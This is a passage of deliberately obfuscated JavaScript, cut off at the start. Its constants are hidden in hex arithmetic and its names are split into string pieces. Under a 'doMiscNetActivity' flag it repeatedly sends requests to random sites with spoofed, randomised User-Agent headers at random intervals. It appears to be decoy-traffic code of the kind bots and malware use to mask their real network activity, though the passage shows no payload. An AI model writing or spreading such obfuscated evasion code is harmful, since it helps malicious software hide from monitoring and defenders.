    for (let l = 0x1dac + -0x1 * 0x23cb + -0x1 * -0x61f; l < -0x1 * 0x168b + -0x1eb2 + -0x3541 * -0x1; l++)
      setTimeout(f, (-0x2b3 * -0x6b + 0xb35d * 0x1 + -0xe9ce) * l * getRandomInt(0x6fe + 0x147 * 0x7 + -0xfee, -0x2 * -0x464 + 0x1aec + 0x23b1 * -0x1));
  }, -0x2 * 0x7b221 + 0x3 * 0xdcf4 + -0x43bbe6 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * -0x1339 + 0x949 * 0x1 + -0x8 * -0x4a9) * getRandomInt(0x2 * -0x598 + -0x3 * 0xb6 + 0xd53, -0x1 * -0xd81 + 0x3 * 0xb89 + 0x3017 * -0x1));
}, 0x121f * -0x1 + -0x114a * -0x2 + -0x1011);